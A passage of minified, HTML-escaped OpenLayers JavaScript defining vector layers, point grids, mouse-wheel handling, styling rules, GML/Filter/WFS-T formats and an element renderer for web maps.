a=0,b=this.renderers.length;a&lt;b;a++)&#123;var c=this.renderers[a];if((c="function"==typeof c?c:OpenLayers.Renderer[c])&amp;&amp;c.prototype.supported())&#123;this.renderer=new c(this.div,this.rendererOptions);break&#125;&#125;&#125;,displayError:function()&#123;this.reportError&amp;&amp;OpenLayers.Console.userError(OpenLayers.i18n("browserNotSupported",&#123;renderers:this.renderers.join("\n")&#125;))&#125;,setMap:function(a)&#123;OpenLayers.Layer.prototype.setMap.apply(this,arguments);if(this.renderer)&#123;this.renderer.map=this.map;var b=this.map.getSize();b.w*=this.ratio;b.h*=this.ratio;this.renderer.setSize(b)&#125;else this.map.removeLayer(this)&#125;,afterAdd:function()&#123;if(this.strategies)&#123;var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.activate()&#125;&#125;,removeMap:function(a)&#123;this.drawn=!1;if(this.strategies)&#123;var b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.deactivate()&#125;&#125;,onMapResize:function()&#123;OpenLayers.Layer.prototype.onMapResize.apply(this,arguments);var a=this.map.getSize();a.w*=this.ratio;a.h*=this.ratio;this.renderer.setSize(a)&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=!0;if(!c)&#123;this.renderer.root.style.visibility="hidden";var d=this.map.getSize(),e=d.w,d=d.h,e=e/2*this.ratio-e/2,d=d/2*this.ratio-d/2,e=e+this.map.layerContainerOriginPx.x,e=-Math.round(e),d=d+this.map.layerContainerOriginPx.y,d=-Math.round(d);this.div.style.left=e+"px";this.div.style.top=d+"px";e=this.map.getExtent().scale(this.ratio);d=this.renderer.setExtent(e,b);this.renderer.root.style.visibility="visible";!0===OpenLayers.IS_GECKO&amp;&amp;(this.div.scrollLeft=this.div.scrollLeft);if(!b&amp;&amp;d)for(var f in this.unrenderedFeatures)e=this.unrenderedFeatures[f],this.drawFeature(e)&#125;if(!this.drawn||b||!d)for(this.drawn=!0,f=0,d=this.features.length;f&lt;d;f++)this.renderer.locked=f!==d-1,e=this.features[f],this.drawFeature(e)&#125;,display:function(a)&#123;OpenLayers.Layer.prototype.display.apply(this,arguments);var b=this.div.style.display;b!=this.renderer.root.style.display&amp;&amp;(this.renderer.root.style.display=b)&#125;,addFeatures:function(a,b)&#123;OpenLayers.Util.isArray(a)||(a=[a]);var c=!b||!b.silent;if(c)&#123;var d=&#123;features:a&#125;;if(!1===this.events.triggerEvent("beforefeaturesadded",d))return;a=d.features&#125;for(var d=[],e=0,f=a.length;e&lt;f;e++)&#123;this.renderer.locked=e!=a.length-1?!0:!1;var g=a[e];if(this.geometryType&amp;&amp;!(g.geometry instanceof this.geometryType))throw new TypeError("addFeatures: component should be an "+this.geometryType.prototype.CLASS_NAME);g.layer=this;!g.style&amp;&amp;this.style&amp;&amp;(g.style=OpenLayers.Util.extend(&#123;&#125;,this.style));if(c)&#123;if(!1===this.events.triggerEvent("beforefeatureadded",&#123;feature:g&#125;))continue;this.preFeatureInsert(g)&#125;d.push(g);this.features.push(g);this.drawFeature(g);c&amp;&amp;(this.events.triggerEvent("featureadded",&#123;feature:g&#125;),this.onFeatureInsert(g))&#125;c&amp;&amp;this.events.triggerEvent("featuresadded",&#123;features:d&#125;)&#125;,removeFeatures:function(a,b)&#123;if(a&amp;&amp;0!==a.length)&#123;if(a===this.features)return this.removeAllFeatures(b);OpenLayers.Util.isArray(a)||(a=[a]);a===this.selectedFeatures&amp;&amp;(a=a.slice());var c=!b||!b.silent;c&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",&#123;features:a&#125;);for(var d=a.length-1;0&lt;=d;d--)&#123;this.renderer.locked=0!=d&amp;&amp;a[d-1].geometry?!0:!1;var e=a[d];delete this.unrenderedFeatures[e.id];c&amp;&amp;this.events.triggerEvent("beforefeatureremoved",&#123;feature:e&#125;);this.features=OpenLayers.Util.removeItem(this.features,e);e.layer=null;e.geometry&amp;&amp;this.renderer.eraseFeatures(e);-1!=OpenLayers.Util.indexOf(this.selectedFeatures,e)&amp;&amp;OpenLayers.Util.removeItem(this.selectedFeatures,e);c&amp;&amp;this.events.triggerEvent("featureremoved",&#123;feature:e&#125;)&#125;c&amp;&amp;this.events.triggerEvent("featuresremoved",&#123;features:a&#125;)&#125;&#125;,removeAllFeatures:function(a)&#123;a=!a||!a.silent;var b=this.features;a&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",&#123;features:b&#125;);for(var c,d=b.length-1;0&lt;=d;d--)c=b[d],a&amp;&amp;this.events.triggerEvent("beforefeatureremoved",&#123;feature:c&#125;),c.layer=null,a&amp;&amp;this.events.triggerEvent("featureremoved",&#123;feature:c&#125;);this.renderer.clear();this.features=[];this.unrenderedFeatures=&#123;&#125;;this.selectedFeatures=[];a&amp;&amp;this.events.triggerEvent("featuresremoved",&#123;features:b&#125;)&#125;,destroyFeatures:function(a,b)&#123;void 0==a&amp;&amp;(a=this.features);if(a)&#123;this.removeFeatures(a,b);for(var c=a.length-1;0&lt;=c;c--)a[c].destroy()&#125;&#125;,drawFeature:function(a,b)&#123;if(this.drawn)&#123;if("object"!=typeof b)&#123;b||a.state!==OpenLayers.State.DELETE||(b="delete");var c=b||a.renderIntent;(b=a.style||this.style)||(b=this.styleMap.createSymbolizer(a,c))&#125;c=this.renderer.drawFeature(a,b);!1===c||null===c?this.unrenderedFeatures[a.id]=a:delete this.unrenderedFeatures[a.id]&#125;&#125;,eraseFeatures:function(a)&#123;this.renderer.eraseFeatures(a)&#125;,getFeatureFromEvent:function(a)&#123;if(!this.renderer)throw Error("getFeatureFromEvent called on layer with no renderer. This usually means you destroyed a layer, but not some handler which is associated with it.");var b=null;(a=this.renderer.getFeatureIdFromEvent(a))&amp;&amp;(b="string"===typeof a?this.getFeatureById(a):a);return b&#125;,getFeatureBy:function(a,b)&#123;for(var c=null,d=0,e=this.features.length;d&lt;e;++d)if(this.features[d][a]==b)&#123;c=this.features[d];break&#125;return c&#125;,getFeatureById:function(a)&#123;return this.getFeatureBy("id",a)&#125;,getFeatureByFid:function(a)&#123;return this.getFeatureBy("fid",a)&#125;,getFeaturesByAttribute:function(a,b)&#123;var c,d,e=this.features.length,f=[];for(c=0;c&lt;e;c++)(d=this.features[c])&amp;&amp;d.attributes&amp;&amp;d.attributes[a]===b&amp;&amp;f.push(d);return f&#125;,onFeatureInsert:function(a)&#123;&#125;,preFeatureInsert:function(a)&#123;&#125;,getDataExtent:function()&#123;var a=null,b=this.features;if(b&amp;&amp;0&lt;b.length)for(var c=null,d=0,e=b.length;d&lt;e;d++)if(c=b[d].geometry)null===a&amp;&amp;(a=new OpenLayers.Bounds),a.extend(c.getBounds());return a&#125;,CLASS_NAME:"OpenLayers.Layer.Vector"&#125;);OpenLayers.Layer.PointGrid=OpenLayers.Class(OpenLayers.Layer.Vector,&#123;dx:null,dy:null,ratio:1.5,maxFeatures:250,rotation:0,origin:null,gridBounds:null,initialize:function(a)&#123;a=a||&#123;&#125;;OpenLayers.Layer.Vector.prototype.initialize.apply(this,[a.name,a])&#125;,setMap:function(a)&#123;OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);a.events.register("moveend",this,this.onMoveEnd)&#125;,removeMap:function(a)&#123;a.events.unregister("moveend",this,this.onMoveEnd);OpenLayers.Layer.Vector.prototype.removeMap.apply(this,arguments)&#125;,setRatio:function(a)&#123;this.ratio=a;this.updateGrid(!0)&#125;,setMaxFeatures:function(a)&#123;this.maxFeatures=a;this.updateGrid(!0)&#125;,setSpacing:function(a,b)&#123;this.dx=a;this.dy=b||a;this.updateGrid(!0)&#125;,setOrigin:function(a)&#123;this.origin=a;this.updateGrid(!0)&#125;,getOrigin:function()&#123;this.origin||(this.origin=this.map.getExtent().getCenterLonLat());return this.origin&#125;,setRotation:function(a)&#123;this.rotation=a;this.updateGrid(!0)&#125;,onMoveEnd:function()&#123;this.updateGrid()&#125;,getViewBounds:function()&#123;var a=this.map.getExtent();if(this.rotation)&#123;var b=this.getOrigin(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),a=a.toGeometry();a.rotate(-this.rotation,b);a=a.getBounds()&#125;return a&#125;,updateGrid:function(a)&#123;if(a||this.invalidBounds())&#123;var b=this.getViewBounds(),c=this.getOrigin();a=new OpenLayers.Geometry.Point(c.lon,c.lat);var d=b.getWidth(),e=b.getHeight(),f=d/e,g=Math.sqrt(this.dx*this.dy*this.maxFeatures/f),d=Math.min(d*this.ratio,g*f),e=Math.min(e*this.ratio,g),b=b.getCenterLonLat();this.gridBounds=new OpenLayers.Bounds(b.lon-d/2,b.lat-e/2,b.lon+d/2,b.lat+e/2);for(var b=Math.floor(e/this.dy),d=Math.floor(d/this.dx),e=c.lon+this.dx*Math.ceil((this.gridBounds.left-c.lon)/this.dx),c=c.lat+this.dy*Math.ceil((this.gridBounds.bottom-c.lat)/this.dy),g=Array(b*d),h,k=0;k&lt;d;++k)for(var f=e+k*this.dx,l=0;l&lt;b;++l)h=c+l*this.dy,h=new OpenLayers.Geometry.Point(f,h),this.rotation&amp;&amp;h.rotate(this.rotation,a),g[k*b+l]=new OpenLayers.Feature.Vector(h);this.destroyFeatures(this.features,&#123;silent:!0&#125;);this.addFeatures(g,&#123;silent:!0&#125;)&#125;&#125;,invalidBounds:function()&#123;return!this.gridBounds||!this.gridBounds.containsBounds(this.getViewBounds())&#125;,CLASS_NAME:"OpenLayers.Layer.PointGrid"&#125;);OpenLayers.Handler.MouseWheel=OpenLayers.Class(OpenLayers.Handler,&#123;wheelListener:null,interval:0,maxDelta:Number.POSITIVE_INFINITY,delta:0,cumulative:!0,initialize:function(a,b,c)&#123;OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.wheelListener=OpenLayers.Function.bindAsEventListener(this.onWheelEvent,this)&#125;,destroy:function()&#123;OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.wheelListener=null&#125;,onWheelEvent:function(a)&#123;if(this.map&amp;&amp;this.checkModifiers(a))&#123;for(var b=!1,c=!1,d=!1,e=OpenLayers.Event.element(a);null!=e&amp;&amp;!d&amp;&amp;!b;)&#123;if(!b)try&#123;var f,b=(f=e.currentStyle?e.currentStyle.overflow:document.defaultView.getComputedStyle(e,null).getPropertyValue("overflow"))&amp;&amp;"auto"==f||"scroll"==f&#125;catch(g)&#123;&#125;if(!c&amp;&amp;(c=OpenLayers.Element.hasClass(e,"olScrollable"),!c))for(var d=0,h=this.map.layers.length;d&lt;h;d++)&#123;var k=this.map.layers[d];if(e==k.div||e==k.pane)&#123;c=!0;break&#125;&#125;d=e==this.map.div;e=e.parentNode&#125;if(!b&amp;&amp;d)&#123;if(c)if(b=0,a.wheelDelta?(b=a.wheelDelta,0===b%160&amp;&amp;(b*=0.75),b/=120):a.detail&amp;&amp;(b=-(a.detail/Math.abs(a.detail))),this.delta+=b,window.clearTimeout(this._timeoutId),this.interval&amp;&amp;Math.abs(this.delta)&lt;this.maxDelta)&#123;var l=OpenLayers.Util.extend(&#123;&#125;,a);this._timeoutId=window.setTimeout(OpenLayers.Function.bind(function()&#123;this.wheelZoom(l)&#125;,this),this.interval)&#125;else this.wheelZoom(a);OpenLayers.Event.stop(a)&#125;&#125;&#125;,wheelZoom:function(a)&#123;var b=this.delta;this.delta=0;b&amp;&amp;(a.xy=this.map.events.getMousePosition(a),0&gt;b?this.callback("down",[a,this.cumulative?Math.max(-this.maxDelta,b):-1]):this.callback("up",[a,this.cumulative?Math.min(this.maxDelta,b):1]))&#125;,activate:function(a)&#123;if(OpenLayers.Handler.prototype.activate.apply(this,arguments))&#123;var b=this.wheelListener;OpenLayers.Event.observe(window,"DOMMouseScroll",b);OpenLayers.Event.observe(window,"mousewheel",b);OpenLayers.Event.observe(document,"mousewheel",b);return!0&#125;return!1&#125;,deactivate:function(a)&#123;if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments))&#123;var b=this.wheelListener;OpenLayers.Event.stopObserving(window,"DOMMouseScroll",b);OpenLayers.Event.stopObserving(window,"mousewheel",b);OpenLayers.Event.stopObserving(document,"mousewheel",b);return!0&#125;return!1&#125;,CLASS_NAME:"OpenLayers.Handler.MouseWheel"&#125;);OpenLayers.Symbolizer=OpenLayers.Class(&#123;zIndex:0,initialize:function(a)&#123;OpenLayers.Util.extend(this,a)&#125;,clone:function()&#123;return new (eval(this.CLASS_NAME))(OpenLayers.Util.extend(&#123;&#125;,this))&#125;,CLASS_NAME:"OpenLayers.Symbolizer"&#125;);OpenLayers.Symbolizer.Raster=OpenLayers.Class(OpenLayers.Symbolizer,&#123;initialize:function(a)&#123;OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Symbolizer.Raster"&#125;);OpenLayers.Rule=OpenLayers.Class(&#123;id:null,name:null,title:null,description:null,context:null,filter:null,elseFilter:!1,symbolizer:null,symbolizers:null,minScaleDenominator:null,maxScaleDenominator:null,initialize:function(a)&#123;this.symbolizer=&#123;&#125;;OpenLayers.Util.extend(this,a);this.symbolizers&amp;&amp;delete this.symbolizer;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,destroy:function()&#123;for(var a in this.symbolizer)this.symbolizer[a]=null;this.symbolizer=null;delete this.symbolizers&#125;,evaluate:function(a)&#123;var b=this.getContext(a),c=!0;if(this.minScaleDenominator||this.maxScaleDenominator)var d=a.layer.map.getScale();this.minScaleDenominator&amp;&amp;(c=d&gt;=OpenLayers.Style.createLiteral(this.minScaleDenominator,b));c&amp;&amp;this.maxScaleDenominator&amp;&amp;(c=d&lt;OpenLayers.Style.createLiteral(this.maxScaleDenominator,b));c&amp;&amp;this.filter&amp;&amp;(c="OpenLayers.Filter.FeatureId"==this.filter.CLASS_NAME?this.filter.evaluate(a):this.filter.evaluate(b));return c&#125;,getContext:function(a)&#123;var b=this.context;b||(b=a.attributes||a.data);"function"==typeof this.context&amp;&amp;(b=this.context(a));return b&#125;,clone:function()&#123;var a=OpenLayers.Util.extend(&#123;&#125;,this);if(this.symbolizers)&#123;var b=this.symbolizers.length;a.symbolizers=Array(b);for(var c=0;c&lt;b;++c)a.symbolizers[c]=this.symbolizers[c].clone()&#125;else&#123;a.symbolizer=&#123;&#125;;for(var d in this.symbolizer)b=this.symbolizer[d],c=typeof b,"object"===c?a.symbolizer[d]=OpenLayers.Util.extend(&#123;&#125;,b):"string"===c&amp;&amp;(a.symbolizer[d]=b)&#125;a.filter=this.filter&amp;&amp;this.filter.clone();a.context=this.context&amp;&amp;OpenLayers.Util.extend(&#123;&#125;,this.context);return new OpenLayers.Rule(a)&#125;,CLASS_NAME:"OpenLayers.Rule"&#125;);OpenLayers.Format.SLD=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;profile:null,defaultVersion:"1.0.0",stringifyOutput:!0,namedLayersAsArray:!1,CLASS_NAME:"OpenLayers.Format.SLD"&#125;);OpenLayers.Symbolizer.Polygon=OpenLayers.Class(OpenLayers.Symbolizer,&#123;initialize:function(a)&#123;OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Symbolizer.Polygon"&#125;);OpenLayers.Format.GML.v2=OpenLayers.Class(OpenLayers.Format.GML.Base,&#123;schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/2.1.2/feature.xsd",initialize:function(a)&#123;OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])&#125;,readers:&#123;gml:OpenLayers.Util.applyDefaults(&#123;outerBoundaryIs:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.outer=c.components[0]&#125;,innerBoundaryIs:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.inner.push(c.components[0])&#125;,Box:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))&#125;&#125;,OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs&#125;,write:function(a)&#123;var b;b=OpenLayers.Util.isArray(a)?"wfs:FeatureCollection":"gml:featureMember";a=this.writeNode(b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;gml:OpenLayers.Util.applyDefaults(&#123;Point:function(a)&#123;var b=this.createElementNSPlus("gml:Point");this.writeNode("coordinates",[a],b);return b&#125;,coordinates:function(a)&#123;for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+","+d.y:d.y+","+d.x,void 0!=d.z&amp;&amp;(c[e]+=","+d.z);return this.createElementNSPlus("gml:coordinates",&#123;attributes:&#123;decimal:".",cs:",",ts:" "&#125;,value:1==b?c[0]:c.join(" ")&#125;)&#125;,LineString:function(a)&#123;var b=this.createElementNSPlus("gml:LineString");this.writeNode("coordinates",a.components,b);return b&#125;,Polygon:function(a)&#123;var b=this.createElementNSPlus("gml:Polygon");this.writeNode("outerBoundaryIs",a.components[0],b);for(var c=1;c&lt;a.components.length;++c)this.writeNode("innerBoundaryIs",a.components[c],b);return b&#125;,outerBoundaryIs:function(a)&#123;var b=this.createElementNSPlus("gml:outerBoundaryIs");this.writeNode("LinearRing",a,b);return b&#125;,innerBoundaryIs:function(a)&#123;var b=this.createElementNSPlus("gml:innerBoundaryIs");this.writeNode("LinearRing",a,b);return b&#125;,LinearRing:function(a)&#123;var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("coordinates",a.components,b);return b&#125;,Box:function(a)&#123;var b=this.createElementNSPlus("gml:Box");this.writeNode("coordinates",[&#123;x:a.left,y:a.bottom&#125;,&#123;x:a.right,y:a.top&#125;],b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b&#125;&#125;,OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs&#125;,CLASS_NAME:"OpenLayers.Format.GML.v2"&#125;);OpenLayers.Format.Filter.v1_0_0=OpenLayers.Class(OpenLayers.Format.GML.v2,OpenLayers.Format.Filter.v1,&#123;VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.0.0/filter.xsd",initialize:function(a)&#123;OpenLayers.Format.GML.v2.prototype.initialize.apply(this,[a])&#125;,readers:&#123;ogc:OpenLayers.Util.applyDefaults(&#123;PropertyIsEqualTo:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.EQUAL_TO&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsNotEqualTo:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsLike:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.LIKE&#125;);this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escape");c.value2regex(d,e,f);b.filters.push(c)&#125;&#125;,OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,feature:OpenLayers.Format.GML.v2.prototype.readers.feature&#125;,writers:&#123;ogc:OpenLayers.Util.applyDefaults(&#123;PropertyIsEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsNotEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsLike:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsLike",&#123;attributes:&#123;wildCard:"*",singleChar:".",escape:"!"&#125;&#125;);this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b&#125;,BBOX:function(a)&#123;var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Box",a.value,b);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);return b&#125;&#125;,OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature&#125;,writeSpatial:function(a,b)&#123;var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else&#123;var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Box",a.value);a.projection&amp;&amp;d.setAttribute("srsName",a.projection);c.appendChild(d)&#125;return c&#125;,CLASS_NAME:"OpenLayers.Format.Filter.v1_0_0"&#125;);OpenLayers.Format.WFST.v1_0_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,OpenLayers.Format.WFST.v1,&#123;version:"1.0.0",srsNameInQuery:!1,schemaLocations:&#123;wfs:"http://schemas.opengis.net/wfs/1.0.0/WFS-transaction.xsd"&#125;,initialize:function(a)&#123;OpenLayers.Format.Filter.v1_0_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])&#125;,readNode:function(a,b,c)&#123;return OpenLayers.Format.GML.v2.prototype.readNode.apply(this,arguments)&#125;,readers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;WFS_TransactionResponse:function(a,b)&#123;b.insertIds=[];b.success=!1;this.readChildNodes(a,b)&#125;,InsertResult:function(a,b)&#123;var c=&#123;fids:[]&#125;;this.readChildNodes(a,c);b.insertIds=b.insertIds.concat(c.fids)&#125;,TransactionResult:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Status:function(a,b)&#123;this.readChildNodes(a,b)&#125;,SUCCESS:function(a,b)&#123;b.success=!0&#125;&#125;,OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,feature:OpenLayers.Format.GML.v2.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.readers.ogc&#125;,writers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;Query:function(a)&#123;a=OpenLayers.Util.extend(&#123;featureNS:this.featureNS,featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName,srsNameInQuery:this.srsNameInQuery&#125;,a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",&#123;attributes:&#123;typeName:(b?b+":":"")+a.featureType&#125;&#125;);a.srsNameInQuery&amp;&amp;a.srsName&amp;&amp;c.setAttribute("srsName",a.srsName);a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt;d;b++)this.writeNode("ogc:PropertyName",&#123;property:a.propertyNames[b]&#125;,c);a.filter&amp;&amp;(this.setFilterProperty(a.filter),this.writeNode("ogc:Filter",a.filter,c));return c&#125;&#125;,OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.writers.ogc&#125;,CLASS_NAME:"OpenLayers.Format.WFST.v1_0_0"&#125;);OpenLayers.ElementsIndexer=OpenLayers.Class(&#123;maxZIndex:null,order:null,indices:null,compare:null,initialize:function(a)&#123;this.compare=a?OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_Y_ORDER:OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_DRAWING_ORDER;this.clear()&#125;,insert:function(a)&#123;this.exists(a)&amp;&amp;this.remove(a);var b=a.id;this.determineZIndex(a);for(var c=-1,d=this.order.length,e;1&lt;d-c;)e=parseInt((c+d)/2),0&lt;this.compare(this,a,OpenLayers.Util.getElement(this.order[e]))?c=e:d=e;this.order.splice(d,0,b);this.indices[b]=this.getZIndex(a);return this.getNextElement(d)&#125;,remove:function(a)&#123;a=a.id;var b=OpenLayers.Util.indexOf(this.order,a);0&lt;=b&amp;&amp;(this.order.splice(b,1),delete this.indices[a],this.maxZIndex=0&lt;this.order.length?this.indices[this.order[this.order.length-1]]:0)&#125;,clear:function()&#123;this.order=[];this.indices=&#123;&#125;;this.maxZIndex=0&#125;,exists:function(a)&#123;return null!=this.indices[a.id]&#125;,getZIndex:function(a)&#123;return a._style.graphicZIndex&#125;,determineZIndex:function(a)&#123;var b=a._style.graphicZIndex;null==b?(b=this.maxZIndex,a._style.graphicZIndex=b):b&gt;this.maxZIndex&amp;&amp;(this.maxZIndex=b)&#125;,getNextElement:function(a)&#123;a+=1;if(a&lt;this.order.length)&#123;var b=OpenLayers.Util.getElement(this.order[a]);void 0==b&amp;&amp;(b=this.getNextElement(a));return b&#125;return null&#125;,CLASS_NAME:"OpenLayers.ElementsIndexer"&#125;);OpenLayers.ElementsIndexer.IndexingMethods=&#123;Z_ORDER:function(a,b,c)&#123;b=a.getZIndex(b);var d=0;c&amp;&amp;(a=a.getZIndex(c),d=b-a);return d&#125;,Z_ORDER_DRAWING_ORDER:function(a,b,c)&#123;a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0==a&amp;&amp;(a=1);return a&#125;,Z_ORDER_Y_ORDER:function(a,b,c)&#123;a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&amp;&amp;0===a&amp;&amp;(b=c._boundsBottom-b._boundsBottom,a=0===b?1:b);return a&#125;&#125;;OpenLayers.Renderer.Elements=OpenLayers.Class(OpenLayers.Renderer,&#123;rendererRoot:null,root:null,vectorRoot:null,textRoot:null,xmlns:null,xOffset:0,indexer:null,BACKGROUND_ID_SUFFIX:"_background",LABEL_ID_SUFFIX:"_label",LABEL_OUTLINE_SUFFIX:"_outline",initialize:function(a,b)&#123;OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.rendererRoot=this.createRenderRoot();this.root=this.createRoot("_root");this.vectorRoot=this.createRoot("_vroot");this.textRoot=this.createRoot("_troot");this.root.appendChild(this.vectorRoot);this.root.appendChild(this.textRoot);this.rendererRoot.appendChild(this.root);this.container.appendChild(this.rendererRoot);b&amp;&amp;(b.zIndexing||b.yOrdering)&amp;&amp;(this.indexer=new OpenLayers.ElementsIndexer(b.yOrdering))&#125;,destroy:function()&#123;this.clear();this.xmlns=this.root=this.rendererRoot=null;OpenLayers.Renderer.prototype.destroy.apply(this,arguments)&#125;,clear:function()&#123;var a,b=this.vectorRoot;if(b)for(;a=b.firstChild;)b.removeChild(a);if(b=this.textRoot)for(;a=b.firstChild;)b.removeChild(a);this.indexer&amp;&amp;this.indexer.clear()&#125;,setExtent:function(a,b)&#123;var c=OpenLayers.Renderer.prototype.setExtent.apply(this,arguments),d=this.getResolution();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine)&#123;var e,f=a.getWidth()/this.map.getExtent().getWidth();a=a.scale(1/f);f=this.map.getMaxExtent();f.right&gt;a.left&amp;&amp;f.right&lt;a.right?e=!0:f.left&gt;a.left&amp;&amp;f.left&lt;a.right&amp;&amp;(e=!1);if(e!==this.rightOfDateLine||b)c=!1,this.xOffset=!0===e?f.getWidth()/d:0;this.rightOfDateLine=e&#125;return c&#125;,getNodeType:function(a,b)&#123;&#125;,drawGeometry:function(a,b,c)&#123;var d=a.CLASS_NAME,e=!0;if("OpenLayers.Geometry.Collection"==d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d)&#123;for(var d=0,f=a.components.length;d&lt;f;d++)e=this.drawGeometry(a.components[d],b,c)&amp;&amp;e;return e&#125;d=e=!1;"none"!=b.display&amp;&amp;(b.backgroundGraphic?this.redrawBackgroundNode(a.id,a,b,c):d=!0,e=this.redrawNode(a.id,a,b,c));!1==e&amp;&amp;(b=document.getElementById(a.id))&amp;&amp;(b._style.backgroundGraphic&amp;&amp;(d=!0),b.parentNode.removeChild(b));d&amp;&amp;(b=document.getElementById(a.id+this.BACKGROUND_ID_SUFFIX))&amp;&amp;b.parentNode.removeChild(b);return e&#125;,redrawNode:function(a,b,c,d)&#123;c=this.applyDefaultSymbolizer(c);a=this.nodeFactory(a,this.getNodeType(b,c));a._featureId=d;a._boundsBottom=b.getBounds().bottom;a._geometryClass=b.CLASS_NAME;a._style=c;b=this.drawGeometryNode(a,b,c);if(!1===b)return!1;a=b.node;this.indexer?(c=this.indexer.insert(a))?this.vectorRoot.insertBefore(a,c):this.vectorRoot.appendChild(a):a.parentNode!==this.vectorRoot&amp;&amp;this.vectorRoot.appendChild(a);this.postDraw(a);return b.complete&#125;,redrawBackgroundNode:function(a,b,c,d)&#123;c=OpenLayers.Util.extend(&#123;&#125;,c);c.externalGraphic=c.backgroundGraphic;c.graphicXOffset=c.backgroundXOffset;c.graphicYOffset=c.backgroundYOffset;c.graphicZIndex=c.backgroundGraphicZIndex;c.graphicWidth=c.backgroundWidth||c.graphicWidth;c.graphicHeight=c.backgroundHeight||c.graphicHeight;c.backgroundGraphic=null;c.backgroundXOffset=null;c.backgroundYOffset=null;c.backgroundGraphicZIndex=null;return 